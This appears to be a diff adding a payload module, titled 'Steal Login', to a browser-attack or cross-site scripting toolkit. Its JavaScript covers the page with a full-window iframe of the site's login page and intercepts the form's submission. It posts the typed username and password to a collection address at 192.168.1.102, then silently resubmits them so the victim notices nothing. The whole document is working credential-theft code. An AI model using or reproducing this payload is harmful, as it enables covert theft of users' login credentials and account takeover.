@@ -1,0 +1,59 @@
+Steal Login
+
+------$$gr4y-r0se$$------
+
+Steal the login!
+
+------$$gr4y-r0se$$------
+
+text/javascript
+
+------$$gr4y-r0se$$------
+
+if (window.self === window.top) {
+
+    function resizeIframe() {
+        const iframe = document.getElementById('hijacked');
+        iframe.style.width = window.innerWidth + 'px';
+        iframe.style.height = window.innerHeight + 'px';
+    }
+    function hijack() {
+        history.pushState('', '', '/login');
+        const form = this.contentWindow.document.getElementById('loginForm');
+        form.addEventListener('submit',steal);
+    }
+    function steal(event){
+        event.preventDefault();
+        const iframe = document.getElementById('hijacked');
+        var user = iframe.contentWindow.document.getElementById('username');
+        var pass = iframe.contentWindow.document.getElementById('password');
+        fetch('https://192.168.1.102/collect/vjnzszavqa',
+            {
+                method:'POST',
+                mode: 'no-cors',
+                body:user.value+':'+pass.value
+            });
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = '/login';
+        const input1 = document.createElement('input');
+        input1.type = 'hidden';
+        input1.name = 'username';
+        input1.value = user.value;
+        const input2 = document.createElement('input');
+        input2.type = 'hidden';
+        input2.name = 'password';
+        input2.value = pass.value;
+        form.appendChild(input1);
+        form.appendChild(input2);
+        iframe.contentWindow.document.body.appendChild(form);
+        form.submit();
+    }
+    var body = document.getElementsByTagName('body')[0];
+    body.setAttribute('style','overflow: hidden;');
+    body.innerHTML = '<iframe src="/login" id="hijacked"  scrolling="no" style="border: none;  overflow: hidden;"></iframe>';
+    resizeIframe();
+    const iframe = document.getElementById('hijacked');
+    iframe.addEventListener('load', hijack);
+    window.addEventListener('resize', resizeIframe);
+}
